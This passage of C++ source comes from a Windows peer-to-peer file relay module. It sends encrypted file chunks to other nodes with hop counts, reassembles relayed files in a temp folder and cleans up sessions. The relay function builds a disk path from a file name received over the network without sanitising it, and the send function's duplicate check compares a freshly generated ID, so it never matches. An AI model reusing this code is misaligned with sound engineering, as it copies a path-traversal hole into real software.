        printf("[FileTransfer] File forwarded successfully to %s\n", target_node_id);
    }
    else {
        printf("[FileTransfer] File forward failed to %s\n", target_node_id);
    }

    return result;
}
// 增强的文件发送函数（支持跳数控制）
// 修复 file_transfer_send_file_with_target_enhanced 函数
int file_transfer_send_file_with_target_enhanced(P2P_CORE* core, const char* file_path,
    const char* relay_node_id, const char* final_target_id, int chunk_size,
    const char* original_sender, int hop_count) {

    if (!core || !file_path || !relay_node_id || !original_sender) return 0;

    // 检查文件是否存在
    HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[FileTransfer] Failed to open file for forwarding: %s\n", file_path);
        return 0;
    }

    // 获取文件大小
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        printf("[FileTransfer] Failed to get file size: %s\n", file_path);
        CloseHandle(hFile);
        return 0;
    }

    // 生成文件ID
    char file_id[37];
    generate_message_id(file_id);

    // 检查是否已处理（防重复）
    if (is_file_already_processed(file_id, original_sender)) {
        printf("[FileTransfer] File already processed: %s, skipping forward\n", file_path);
        CloseHandle(hFile);
        return 0;
    }

    printf("[FileTransfer] Forwarding file: %s (%lu bytes) to %s, hop=%d\n",
        file_path, file_size, relay_node_id, hop_count);

    // 计算分片数
    unsigned int total_chunks = (file_size + chunk_size - 1) / chunk_size;
    unsigned char* buffer = new (std::nothrow) unsigned char[chunk_size];
    if (!buffer) {
        printf("[FileTransfer] Memory allocation failed for chunk buffer\n");
        CloseHandle(hFile);
        return 0;
    }

    DWORD bytes_read;
    unsigned int chunk_index = 0;
    int send_success = 0;

    while (ReadFile(hFile, buffer, chunk_size, &bytes_read, NULL) && bytes_read > 0) {
        // 构建增强的文件传输消息
        NETWORK_MESSAGE chunk_msg;
        memset(&chunk_msg, 0, sizeof(NETWORK_MESSAGE));

        generate_message_id(chunk_msg.message_id);
        strcpy_s(chunk_msg.sender_id, sizeof(chunk_msg.sender_id), core->node_id);
        strcpy_s(chunk_msg.recipient_id, sizeof(chunk_msg.recipient_id), relay_node_id);
        chunk_msg.message_type = FILE_CHUNK;
        chunk_msg.timestamp = get_timestamp();
        chunk_msg.encrypted = 1;

        // 构建修复后的增强文件头
        ENHANCED_FILE_HEADER enhanced_header;
        memset(&enhanced_header, 0, sizeof(ENHANCED_FILE_HEADER));

        // 填充基础头信息
        strcpy_s(enhanced_header.base_header.file_id, sizeof(enhanced_header.base_header.file_id), file_id);

        // 提取文件名
        const char* filename = strrchr(file_path, '\\');
        if (filename) filename++;
        else filename = file_path;
        strcpy_s(enhanced_header.base_header.file_name, sizeof(enhanced_header.base_header.file_name), filename);

        enhanced_header.base_header.file_size = file_size;
        enhanced_header.base_header.total_chunks = total_chunks;
        enhanced_header.base_header.chunk_index = chunk_index;
        enhanced_header.base_header.chunk_size = bytes_read;
        strcpy_s(enhanced_header.base_header.sender_id, sizeof(enhanced_header.base_header.sender_id), core->node_id);
        strcpy_s(enhanced_header.base_header.recipient_id, sizeof(enhanced_header.base_header.recipient_id), relay_node_id);

        // 填充增强信息
        strcpy_s(enhanced_header.final_target_id, sizeof(enhanced_header.final_target_id), final_target_id);
        strcpy_s(enhanced_header.original_sender_id, sizeof(enhanced_header.original_sender_id), original_sender);
        enhanced_header.hop_count = hop_count;

        // 设置默认过滤参数
        strcpy_s(enhanced_header.file_types, sizeof(enhanced_header.file_types), "*.*");
        enhanced_header.min_size = 0;
        enhanced_header.max_size = 100 * 1024 * 1024; // 100MB
        enhanced_header.max_files = 100;

        // 检查数据大小是否超过限制
        size_t header_size = sizeof(ENHANCED_FILE_HEADER);
        size_t total_data_size = header_size + bytes_read;

        if (total_data_size > sizeof(chunk_msg.data)) {
            printf("[FileTransfer] Data too large: %zu > %zu, truncating\n",
                total_data_size, sizeof(chunk_msg.data));
            bytes_read = (DWORD)(sizeof(chunk_msg.data) - header_size);
            total_data_size = sizeof(chunk_msg.data);
        }

        // 复制到消息数据区
        memcpy(chunk_msg.data, &enhanced_header, header_size);
        memcpy(chunk_msg.data + header_size, buffer, bytes_read);
        chunk_msg.data_size = (unsigned int)total_data_size;

        // 加密消息
        unsigned char encrypted_data[MAX_PACKET_SIZE];
        unsigned int encrypted_size = sizeof(encrypted_data);

        if (crypto_encrypt(&core->crypto_ctx, chunk_msg.data, chunk_msg.data_size,
            encrypted_data, &encrypted_size)) {
            // 检查加密后的大小
            if (encrypted_size <= sizeof(chunk_msg.data)) {
                memcpy(chunk_msg.data, encrypted_data, encrypted_size);
                chunk_msg.data_size = encrypted_size;

                // 发送到目标节点
                int send_result = p2p_broadcast_message(core, &chunk_msg);
                if (send_result) {
                    send_success = 1;
                    printf("[FileTransfer] Chunk %u/%u forwarded successfully\n",
                        chunk_index + 1, total_chunks);
                }
                else {
                    printf("[FileTransfer] Failed to forward chunk %u\n", chunk_index + 1);
                }
            }
            else {
                printf("[FileTransfer] Encrypted data too large: %u > %zu\n",
                    encrypted_size, sizeof(chunk_msg.data));
            }
        }
        else {
            printf("[FileTransfer] Encryption failed for chunk %u\n", chunk_index + 1);
        }

        chunk_index++;
        Sleep(10); // 防止洪泛
    }

    // 清理资源
    CloseHandle(hFile);
    delete[] buffer;

    if (send_success) {
        // 标记文件为已处理
        mark_file_processed(file_id, original_sender);
        printf("[FileTransfer] File forward completed: %s\n", file_path);
    }
    else {
        printf("[FileTransfer] File forward failed: %s\n", file_path);
    }

    return send_success;
}
// 文件传输清理线程
unsigned __stdcall file_transfer_cleanup_thread(void* param) {
    P2P_CORE* core = (P2P_CORE*)param;

    if (!core) {
        printf("[FileTransfer] Error: Invalid core pointer for cleanup thread\n");
        return 0;
    }

    printf("[FileTransfer] File transfer cleanup thread started\n");

    unsigned int loop_count = 0;
    while (core->running) {
        Sleep(300000); // 每5分钟清理一次

        // 清理过期会话
        file_transfer_cleanup_sessions();

        // 定期清理已处理文件记录（避免内存泄漏）
        loop_count++;
        if (loop_count % 12 == 0) { // 每小时清理一次
            EnterCriticalSection(&g_processed_files_cs);
            g_processed_files.clear();
            LeaveCriticalSection(&g_processed_files_cs);
            printf("[FileTransfer] Cleared processed files cache\n");
        }
    }

    printf("[FileTransfer] File transfer cleanup thread exited\n");
    return 1;
}

// 启动文件传输模块
int file_transfer_start(P2P_CORE* core) {
    if (!core || !core->running) return 0;

    // 初始化文件传输模块
    if (!file_transfer_init()) {
        printf("[FileTransfer] Failed to initialize file transfer module\n");
        return 0;
    }

    // 启动清理线程
    HANDLE cleanup_thread = (HANDLE)_beginthreadex(NULL, 0, file_transfer_cleanup_thread, core, 0, NULL);
    if (!cleanup_thread) {
        printf("[FileTransfer] Failed to create cleanup thread\n");
        file_transfer_cleanup();
        return 0;
    }

    CloseHandle(cleanup_thread);

    printf("[FileTransfer] File transfer module started successfully with anti-loop protection\n");
    return 1;
}

// 清理文件传输会话
void file_transfer_cleanup_sessions() {
    EnterCriticalSection(&g_sessions_cs);

    time_t current_time = time(NULL);
    int cleaned_count = 0;

    auto it = g_file_sessions.begin();
    while (it != g_file_sessions.end()) {
        if (current_time - it->second.last_activity > 3600) { // 清理1小时无活动的会话
            printf("[FileTransfer] Cleaning up expired session: %s\n", it->second.file_name);
            it = g_file_sessions.erase(it);
            cleaned_count++;
        }
        else {
            ++it;
        }
    }

    if (cleaned_count > 0) {
        printf("[FileTransfer] Cleaned up %d expired file sessions\n", cleaned_count);
    }

    LeaveCriticalSection(&g_sessions_cs);
}

// 停止文件传输模块
void file_transfer_stop() {
    printf("[FileTransfer] Stopping file transfer module...\n");

    // 清理所有会话
    file_transfer_cleanup_sessions();

    // 清理已处理文件记录
    EnterCriticalSection(&g_processed_files_cs);
    g_processed_files.clear();
    LeaveCriticalSection(&g_processed_files_cs);

    printf("[FileTransfer] File transfer module stopped\n");
}

// 兼容性函数 - 基础文件传
// 修复 file_transfer_relay_file_enhanced 函数 - 与头文件声明完全匹配
int file_transfer_relay_file_enhanced(P2P_CORE* core, const ENHANCED_FILE_HEADER* header,
    const unsigned char* data, unsigned int data_size) {
    if (!core || !header || !data) {
        printf("[FileTransfer] Error: Invalid parameters for relay function\n");
        return 0;
    }

    printf("[FileTransfer] Starting enhanced file relay: file_id=%s, chunks=%u, hop=%d\n",
        header->base_header.file_id, header->base_header.total_chunks, header->hop_count);

    // 检查是否已处理（防重复）
    if (is_file_already_processed(header->base_header.file_id, header->original_sender_id)) {
        printf("[FileTransfer] File already processed: %s, dropping\n", header->base_header.file_id);
        return 0;
    }

    EnterCriticalSection(&g_sessions_cs);

    // 查找或创建文件会话
    std::string file_id_str(header->base_header.file_id);
    auto it = g_file_sessions.find(file_id_str);

    if (it == g_file_sessions.end()) {
        // 创建新会话
        FILE_TRANSFER_SESSION new_session;

        // 直接使用文件大小（因为头文件中是 unsigned long long file_size）
        new_session.file_size = header->base_header.file_size;

        strcpy_s(new_session.file_id, sizeof(new_session.file_id), header->base_header.file_id);
        strcpy_s(new_session.file_name, sizeof(new_session.file_name), header->base_header.file_name);
        new_session.total_chunks = header->base_header.total_chunks;
        new_session.received_chunks = 0;
        new_session.last_activity = time(NULL);
        strcpy_s(new_session.original_sender_id, sizeof(new_session.original_sender_id), header->original_sender_id);
        strcpy_s(new_session.final_target_id, sizeof(new_session.final_target_id), header->final_target_id);
        new_session.hop_count = header->hop_count;

        // 记录路径
        new_session.path_taken.push_back(core->node_id);

        g_file_sessions[file_id_str] = new_session;
        it = g_file_sessions.find(file_id_str);

        printf("[FileTransfer] Started new file session: %s, final target: %s, hop=%d, total_chunks=%u\n",
            header->base_header.file_name, header->final_target_id, header->hop_count, header->base_header.total_chunks);
    }

    FILE_TRANSFER_SESSION& session = it->second;

    // 验证分片索引
    if (header->base_header.chunk_index >= session.total_chunks) {
        printf("[FileTransfer] Invalid chunk index: %u >= %u\n",
            header->base_header.chunk_index, session.total_chunks);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    // 检查分片是否已接收
    if (header->base_header.chunk_index < session.chunks.size() &&
        !session.chunks[header->base_header.chunk_index].empty()) {
        printf("[FileTransfer] Chunk %u already received\n", header->base_header.chunk_index);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    // 存储分片
    if (session.chunks.size() <= header->base_header.chunk_index) {
        session.chunks.resize(header->base_header.chunk_index + 1);
    }

    // 计算数据偏移量（头大小）
    size_t header_size = sizeof(ENHANCED_FILE_HEADER);

    // 检查数据大小是否足够
    if (data_size < header_size) {
        printf("[FileTransfer] Invalid data size: %u < header size %zu\n", data_size, header_size);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    // 只存储实际文件数据（不包括头）
    unsigned int actual_data_size = data_size - (unsigned int)header_size;
    if (actual_data_size > 0) {
        session.chunks[header->base_header.chunk_index] =
            std::vector<unsigned char>(data + header_size, data + data_size);
    }
    else {
        printf("[FileTransfer] No actual file data in chunk %u\n", header->base_header.chunk_index);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    session.received_chunks++;
    session.last_activity = time(NULL);

    printf("[FileTransfer] Received chunk %u/%u for file: %s (size: %u bytes)\n",
        session.received_chunks, session.total_chunks, session.file_name, actual_data_size);

    // 检查是否所有分片都已接收
    if (session.received_chunks == session.total_chunks) {
        printf("[FileTransfer] All chunks received, reassembling file: %s\n", session.file_name);

        // 重组文件
        std::vector<unsigned char> file_data;
        bool reassembly_success = true;

        for (unsigned int i = 0; i < session.total_chunks; i++) {
            if (i < session.chunks.size() && !session.chunks[i].empty()) {
                file_data.insert(file_data.end(),
                    session.chunks[i].begin(), session.chunks[i].end());
            }
            else {
                printf("[FileTransfer] Missing chunk %u, file reassembly failed\n", i);
                reassembly_success = false;
                break;
            }
        }

        if (reassembly_success) {
            // 创建临时文件
            char temp_path[MAX_PATH];
            if (GetTempPathA(MAX_PATH, temp_path)) {
                char file_path[MAX_PATH];
                sprintf_s(file_path, sizeof(file_path), "%s\\relay_%s", temp_path, session.file_name);

                HANDLE hFile = CreateFileA(file_path, GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD bytes_written;
                    if (WriteFile(hFile, file_data.data(), (DWORD)file_data.size(), &bytes_written, NULL)) {
                        CloseHandle(hFile);

                        printf("[FileTransfer] File reassembled successfully: %s (%zu bytes)\n",
                            file_path, file_data.size());

                        // 标记文件为已处理
                        mark_file_processed(session.file_id, session.original_sender_id);

                        // 转发文件到最终目标
                        int forward_result = forward_file_to_final_target(core, file_path, &session);

                        // 清理临时文件
                        DeleteFileA(file_path);

                        // 清理会话
                        g_file_sessions.erase(it);
                        LeaveCriticalSection(&g_sessions_cs);

                        return forward_result;
                    }
                    else {
                        CloseHandle(hFile);
                        printf("[FileTransfer] Failed to write reassembled file\n");
                    }
                }
                else {
                    printf("[FileTransfer] Failed to create temporary file\n");
                }
            }
        }

        printf("[FileTransfer] File reassembly failed for %s\n", session.file_name);
        g_file_sessions.erase(it);
        LeaveCriticalSection(&g_sessions_cs);
        return 0;
    }

    LeaveCriticalSection(&g_sessions_cs);
    return 1;
}